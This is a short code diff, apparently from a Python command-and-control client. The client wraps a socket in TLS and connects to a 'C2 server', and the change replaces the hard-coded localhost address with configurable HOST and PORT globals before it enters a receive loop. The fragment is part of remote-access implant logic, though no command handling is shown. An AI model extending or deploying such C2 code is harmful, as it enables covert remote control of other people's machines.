@@ -43,7 +43,10 @@ def main():
     ss = context.wrap_socket(s)
 
     # Connect to C2 server
-    ss.connect(("127.0.0.1", 8000))
+    global HOST, PORT
+    if "HOST" not in globals() and "PORT" not in globals():
+        HOST, PORT = "127.0.0.1", 8000
+    ss.connect((HOST, PORT))
 
     while True:
         buffer = ss.recv()
